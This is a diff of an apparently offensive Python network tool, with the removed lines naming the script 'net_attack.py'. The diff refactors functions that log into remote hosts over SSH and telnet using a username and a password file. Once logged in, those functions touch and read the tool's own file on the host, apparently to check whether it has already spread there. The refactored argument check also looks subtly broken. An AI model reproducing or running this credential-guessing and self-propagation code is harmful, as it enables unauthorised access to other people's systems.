@@ -136,7 +136,7 @@ def check_over_ssh(ip, port, username, password):
                        username=str(username), password=str(password))
         client.exec_command(strings.touch_file(os.path.basename(__file__)))
         if str(client.exec_command
-                (strings.cat_file(os.path.basename(__file__)))
+                   (strings.cat_file(os.path.basename(__file__)))
                [1]).__len__() < 1:
             client.close()
             return True
@@ -168,12 +168,16 @@ def check_over_telnet(ip, port, username, password):
         tel.write((str(username) + strings.RETURN_OR_NEWLINE)
                   .encode(strings.ENCODE_ASCII))
         tel.read_until(strings.PASSWORD_PROMPT.encode(strings.ENCODE_ASCII))
-        tel.write((str(password) + "\n").encode("ascii"))
-        data = tel.read_until("Welcome to".encode("ascii"), timeout=4)
-        if check_telnet_data("Welcome to", data):
-            tel.write("cat net_attack.py\n".encode("ascii"))
-            data = tel.read_until("main()".encode("ascii"), timeout=4)
-            if data.__contains__("main()".encode("ascii")):
+        tel.write((str(password) + strings.RETURN_OR_NEWLINE).encode("ascii"))
+        data = tel.read_until(strings.WELCOME_TO.encode(strings.ENCODE_ASCII),
+                              timeout=4)
+        if check_telnet_data(strings.WELCOME_TO, data):
+            tel.write(strings.cat_file(os.path.basename(__file__) +
+                                       strings.RETURN_OR_NEWLINE)
+                      .encode(strings.ENCODE_ASCII))
+            data = tel.read_until(strings.MAIN.encode(strings.ENCODE_ASCII),
+                                  timeout=4)
+            if data.__contains__(strings.MAIN.encode(strings.ENCODE_ASCII)):
                 return False
             return True
         return False
@@ -191,7 +195,7 @@ def check_telnet_data(string_to_check, data):
     :return True: The string was found in the telnet data
     :return False: The string was not found in the telnet data
     """
-    if data.__contains__(string_to_check.encode("ascii")):
+    if data.__contains__(string_to_check.encode(strings.ENCODE_ASCII)):
         return True
     return False
 
@@ -208,8 +212,12 @@ def checking_arguments(arguments):
     :return values[2]: Username to target
     :return values[3]: Filename for a file containing passwords
     """
-    if (("-t" or "-L" in arguments) and "-p" and "-u" and "-f" in arguments
-            and len(arguments) >= 8 and "-h" and "--help" not in arguments):
+    if ((strings.ARGUMENT_IP_ADDRESS_FILENAME or
+         strings.ARGUMENT_SCAN_LOCAL_NETWORKS in arguments) and
+            strings.ARGUMENT_PORTS and strings.ARGUMENT_USERNAME and
+            strings.ARGUMENT_USERNAME in arguments and len(arguments) >= 8 and
+            strings.ARGUMENT_HELP_SHORT and strings.ARGUMENT_HELP_LONG not in
+            arguments):
         try:
             values = assigning_values(arguments)
             return values[0], values[1], values[2], values[3]
